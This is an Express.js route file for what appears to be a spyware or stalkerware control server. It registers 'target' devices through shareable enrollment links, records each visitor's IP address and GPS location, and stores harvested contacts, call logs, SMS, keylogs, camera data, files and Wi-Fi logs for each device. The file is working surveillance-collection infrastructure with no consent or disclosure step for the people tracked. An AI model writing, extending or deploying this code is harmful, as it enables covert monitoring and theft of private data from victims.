const router  = require("express").Router();
const { Devices } = require("../config/db");

const ARRAY_FIELDS = ["contacts","callLogs","sms","location","apps","files","keylogs","iplogs","camera","wifiLogs"];

// ── GET /api/devices — list all devices ──────────────────────────────────────
router.get("/", (req, res) => {
  try {
    res.json(Devices.find());
  } catch (err) {
    console.error("Get devices error:", err.message);
    res.status(500).json({ msg: "Failed to fetch devices" });
  }
});

// ── GET /api/devices/:id — get one device ────────────────────────────────────
router.get("/:id", (req, res) => {
  try {
    const device = Devices.findById(req.params.id);
    if (!device) return res.status(404).json({ msg: "Device not found" });
    res.json(device);
  } catch (err) {
    res.status(500).json({ msg: "Failed to fetch device" });
  }
});

// ── POST /api/devices/add — register a new device ────────────────────────────
router.post("/add", (req, res) => {
  try {
    const device = Devices.create(req.body);
    res.status(201).json({ msg: "Device added", device });
  } catch (err) {
    console.error("Add device error:", err.message);
    res.status(500).json({ msg: "Failed to add device" });
  }
});

// ── PUT /api/devices/:id — update device fields ───────────────────────────────
router.put("/:id", (req, res) => {
  try {
    const device = Devices.findByIdAndUpdate(req.params.id, req.body);
    if (!device) return res.status(404).json({ msg: "Device not found" });
    res.json({ msg: "Device updated", device });
  } catch (err) {
    console.error("Update device error:", err.message);
    res.status(500).json({ msg: "Failed to update device" });
  }
});

// ── PATCH /api/devices/:id/push — push item into an array field ───────────────
// Body: { field: "contacts", data: { name:"...", number:"..." } }
router.patch("/:id/push", (req, res) => {
  try {
    const { field, data } = req.body;
    if (!ARRAY_FIELDS.includes(field)) {
      return res.status(400).json({ msg: "Invalid field name" });
    }
    const device = Devices.findByIdAndPush(req.params.id, field, data);
    if (!device) return res.status(404).json({ msg: "Device not found" });
    res.json({ msg: `${field} updated`, device });
  } catch (err) {
    console.error("Push error:", err.message);
    res.status(500).json({ msg: "Failed to push data" });
  }
});

// ── DELETE /api/devices/:id — remove a device ────────────────────────────────
router.delete("/:id", (req, res) => {
  try {
    const device = Devices.findByIdAndDelete(req.params.id);
    if (!device) return res.status(404).json({ msg: "Device not found" });
    res.json({ msg: "Device deleted" });
  } catch (err) {
    res.status(500).json({ msg: "Failed to delete device" });
  }
});

// ── POST /api/devices/generate-link — create a shareable enrollment token ──────
router.post("/generate-link", (req, res) => {
  try {
    const token = Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
    const label = (req.body.label || "New Device").trim();
    const device = Devices.create({
      name: label,
      comments: "Awaiting enrollment via link",
      lastOnline: "Pending",
      enrollToken: token,
      status: "pending"
    });
    const baseUrl = `${req.protocol}://${req.get("host")}`;
    res.json({
      token,
      deviceId: device._id,
      url: `${baseUrl}/enroll.html?token=${token}`
    });
  } catch (err) {
    console.error("Generate link error:", err.message);
    res.status(500).json({ msg: "Failed to generate enrollment link" });
  }
});

// ── POST /api/devices/enroll/:token — target device submits its data ───────────
router.post("/enroll/:token", (req, res) => {
  try {
    const { token } = req.params;
    const clientIp = req.headers["x-forwarded-for"]?.split(",")[0] || req.ip || "unknown";

    // Basic rate-limit: max 3 enrolls per IP per hour (using in-memory for simplicity)
const rateKey = `enroll:${clientIp}`;
    const now = Date.now();
    const rateLimitWindow = 60 * 60 * 1000; // 1h
    if (!req.app.locals.rateLimits) req.app.locals.rateLimits = {};
    const limits = req.app.locals.rateLimits;
    if (limits[rateKey] && now - limits[rateKey].time < rateLimitWindow && limits[rateKey].count >= 3) {
      return res.status(429).json({ msg: "Too many enroll attempts. Try again later." });
    }
    if (!limits[rateKey]) limits[rateKey] = { count: 0, time: now };
    limits[rateKey].count++;
    if (limits[rateKey].count === 1) limits[rateKey].time = now;

    const device = Devices.findByToken(token);
    if (!device) return res.status(404).json({ msg: "Invalid enrollment link" });

    // Token expiry: 24h
    const expiry = 24 * 60 * 60 * 1000;
    if (now - new Date(device.createdAt).getTime() > expiry) {
      return res.status(410).json({ msg: "Enrollment link expired (24h limit)" });
    }

    // Capture real IP server-side
    const rawIp = req.headers["x-forwarded-for"]?.split(",")[0] ||
                  req.socket?.remoteAddress || req.ip || "Unknown";
    const enrollIpClean = rawIp.replace(/^::ffff:/, "");


    const { name, model, os, battery, screenRes, language, timezone,
            cores, memory, connection, location } = req.body;

    const dateStr = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

    const updates = {
      name:        name     || device.name,
      model:       model    || "Unknown",
      os:          os       || "Unknown",
      battery:     battery  || "—",
      ip: enrollIpClean,
      lastOnline:  dateStr,
      comments:    `Enrolled via link — ${dateStr}`,
      status:      "active",
      screenRes:   screenRes || "",
      language:    language  || "",
      timezone:    timezone  || "",
      cores:       cores     || "",
      memory:      memory    || "",
      connection:  connection || "",
      iplogs: [{ ip: enrollIpClean, network: `Enrolled (${connection || "Unknown"})`, date: dateStr }]
    };

    if (location?.lat) {
      updates.location = [{
        lat:     String(location.lat),
        lng:     String(location.lng),
        address: location.address || "GPS Location",
        date:    dateStr
      }];
    }

    // Clear used token
    const clearedToken = Devices.findByIdAndUpdate(device._id, { enrollToken: "" });

    const updated = Devices.findByIdAndUpdate(device._id, updates);
    res.json({ msg: "Device enrolled successfully", device: updated });
  } catch (err) {
    console.error("Enroll error:", err.message);
    res.status(500).json({ msg: "Enrollment failed" });
  }
});

module.exports = router;